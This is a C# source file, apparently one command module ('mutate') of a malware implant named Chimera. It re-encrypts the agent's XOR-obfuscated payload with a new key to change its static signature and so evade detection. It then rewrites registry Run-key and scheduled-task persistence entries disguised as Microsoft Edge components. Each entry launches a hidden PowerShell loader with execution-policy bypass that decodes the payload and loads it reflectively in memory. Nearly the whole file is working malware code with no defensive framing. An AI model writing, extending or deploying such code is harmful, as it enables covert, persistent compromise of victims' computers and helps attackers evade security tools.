using System;
using System.IO;
using Microsoft.Win32;

namespace Chimera.Commands
{
    // mutate [key_byte]
    //
    // Re-encrypts agent.dat with a new XOR key without recompiling.
    // Steps:
    //   1. Decrypt agent.dat with its current embedded key (0x41 for original blob,
    //      or whatever key was used in a prior mutate run — stored in HKCU).
    //   2. Re-encrypt with the new key.
    //   3. Overwrite agent.dat.
    //   4. Rewrite the HKCU Run persistence loader with the new key.
    //   5. Rewrite the persist2 scheduled task with the new key (if it exists).
    //
    // Key state is stored in HKCU\Software\Microsoft\EdgeSync\Upd (DWORD).
    // If the registry value is absent, original key 0x41 is assumed.
    //
    // Usage:
    //   mutate          — random key in 0x42-0x7E
    //   mutate 0x5F     — specific hex byte
    //   mutate 95       — decimal byte
    public static class Mutate
    {
        private const string RegPath     = @"Software\Microsoft\EdgeSync";
        private const string RegKeyState = "Upd";
        private const string RunPath     = @"Software\Microsoft\Windows\CurrentVersion\Run";
        private const string RunValue    = "MicrosoftEdgeUpdate";
        private const string TaskName    = "MicrosoftEdgeHelper";   // persist2 task name

        private static readonly string BlobPath = Path.Combine(Staging.Dir, "agent.dat");

        public static string Execute(string param)
        {
            var sb = new System.Text.StringBuilder();
            try
            {
                // ------------------------------------------------------------------
                // 1. Determine new key
                // ------------------------------------------------------------------
                byte newKey;
                if (string.IsNullOrEmpty(param) || param.Trim().Length == 0)
                {
                    // Random key in usable printable range (skip 0x00 and 0x41 itself)
                    var rng = new Random();
                    do { newKey = (byte)rng.Next(0x42, 0x7F); }
                    while (newKey == 0x41);
                }
                else
                {
                    string raw = param.Trim();
                    try
                    {
                        newKey = raw.StartsWith("0x") || raw.StartsWith("0X")
                            ? Convert.ToByte(raw.Substring(2), 16)
                            : byte.Parse(raw);
                    }
                    catch
                    {
                        return "[error] Invalid key byte. Use hex (0x5F) or decimal (95).";
                    }
                }

                sb.AppendLine("[*] New XOR key: 0x" + newKey.ToString("X2"));

                // ------------------------------------------------------------------
                // 2. Read current key from registry (default 0x41)
                // ------------------------------------------------------------------
                byte oldKey = 0x41;
                try
                {
                    using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(RegPath))
                    {
                        if (rk != null)
                        {
                            object val = rk.GetValue(RegKeyState);
                            if (val != null) oldKey = (byte)(int)val;
                        }
                    }
                }
                catch { }

                sb.AppendLine("[*] Current key: 0x" + oldKey.ToString("X2"));

                // ------------------------------------------------------------------
                // 3. Decrypt agent.dat with old key, re-encrypt with new key
                // ------------------------------------------------------------------
                if (!File.Exists(BlobPath))
                    return "[error] " + BlobPath + " not found. Run 'persist' first.";

                byte[] blob = File.ReadAllBytes(BlobPath);

                // Decrypt
                byte[] plain = new byte[blob.Length];
                for (int i = 0; i < blob.Length; i++)
                    plain[i] = (byte)(blob[i] ^ oldKey);

                // Re-encrypt
                byte[] newBlob = new byte[plain.Length];
                for (int i = 0; i < plain.Length; i++)
                    newBlob[i] = (byte)(plain[i] ^ newKey);

                // Wipe the plain buffer
                for (int i = 0; i < plain.Length; i++) plain[i] = 0;

                File.WriteAllBytes(BlobPath, newBlob);
                sb.AppendLine("[+] agent.dat re-encrypted (" + newBlob.Length + " bytes).");

                // ------------------------------------------------------------------
                // 4. Store new key in registry
                // ------------------------------------------------------------------
                try
                {
                    using (RegistryKey rk = Registry.CurrentUser.CreateSubKey(RegPath,
                        RegistryKeyPermissionCheck.ReadWriteSubTree))
                    {
                        rk.SetValue(RegKeyState, (int)newKey, RegistryValueKind.DWord);
                    }
                    sb.AppendLine("[+] Key state saved to HKCU\\" + RegPath + "\\" + RegKeyState);
                }
                catch (Exception ex)
                {
                    sb.AppendLine("[-] Could not save key state: " + ex.Message);
                }

                // ------------------------------------------------------------------
                // 5. Rewrite HKCU Run persistence loader with new key
                // ------------------------------------------------------------------
                try
                {
                    string newLoader =
                        @"powershell -ep bypass -WindowStyle Hidden -c " +
                        "\"$k=0x" + newKey.ToString("X2") + ";" +
                        "$d=[IO.File]::ReadAllBytes('" + BlobPath + "');" +
                        "$o=New-Object byte[] $d.Length;" +
                        "for($i=0;$i -lt $d.Length;$i++){$o[$i]=$d[$i]-bxor$k};" +
                        "[Reflection.Assembly]::Load($o).EntryPoint.Invoke($null,@())\"";

                    using (RegistryKey rk =
                        Registry.CurrentUser.OpenSubKey(RunPath, writable: true))
                    {
                        if (rk != null && rk.GetValue(RunValue) != null)
                        {
                            rk.SetValue(RunValue, newLoader, RegistryValueKind.String);
                            sb.AppendLine("[+] HKCU Run key updated with new key.");
                        }
                        else
                        {
                            sb.AppendLine("[*] HKCU Run key not present — skipping.");
                        }
                    }
                }
                catch (Exception ex)
                {
                    sb.AppendLine("[-] Run key update failed: " + ex.Message);
                }

                // ------------------------------------------------------------------
                // 6. Rewrite persist2 scheduled task if it exists
                // ------------------------------------------------------------------
                try
                {
                    string taskInfo = RunCmd("schtasks /query /tn \"" + TaskName + "\" /fo LIST");
                    bool taskExists =
                        taskInfo.IndexOf(TaskName, StringComparison.OrdinalIgnoreCase) >= 0 &&
                        taskInfo.IndexOf("Could not be found",
                            StringComparison.OrdinalIgnoreCase) < 0;

                    if (taskExists)
                    {
                        // Rebuild the task with the new key
                        string newTaskCmd =
                            "schtasks /create" +
                            " /tn \"" + TaskName + "\"" +
                            " /sc ONLOGON" +
                            " /tr \"powershell.exe -ep bypass -WindowStyle Hidden -c " +
                            "\\\"$k=0x" + newKey.ToString("X2") + ";" +
                            "$d=[IO.File]::ReadAllBytes('" + BlobPath + "');" +
                            "$o=New-Object byte[] $d.Length;" +
                            "for($i=0;$i -lt $d.Length;$i++){$o[$i]=$d[$i]-bxor$k};" +
                            "[Reflection.Assembly]::Load($o).EntryPoint.Invoke($null,@())\\\"\"" +
                            " /rl HIGHEST /f";
                        RunCmd(newTaskCmd);
                        sb.AppendLine("[+] Scheduled task '" + TaskName + "' updated with new key.");
                    }
                    else
                    {
                        sb.AppendLine("[*] Scheduled task '" + TaskName + "' not found — skipping.");
                    }
                }
                catch (Exception ex)
                {
                    sb.AppendLine("[-] Scheduled task update failed: " + ex.Message);
                }

                sb.AppendLine();
                sb.AppendLine("[+] Mutation complete.");
                sb.AppendLine("    Old key: 0x" + oldKey.ToString("X2") +
                              "  ->  New key: 0x" + newKey.ToString("X2"));
                sb.AppendLine("    Static signature of agent.dat has changed.");
            }
            catch (Exception ex)
            {
                sb.AppendLine("[error] mutate: " + ex.Message);
            }
            return sb.ToString();
        }

        private static string RunCmd(string cmd)
        {
            var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + cmd)
            {
                UseShellExecute        = false,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                CreateNoWindow         = true
            };
            using (System.Diagnostics.Process p =
                System.Diagnostics.Process.Start(psi))
            {
                string o = p.StandardOutput.ReadToEnd();
                string e = p.StandardError.ReadToEnd();
                p.WaitForExit(10000);
                return o + e;
            }
        }
    }
}
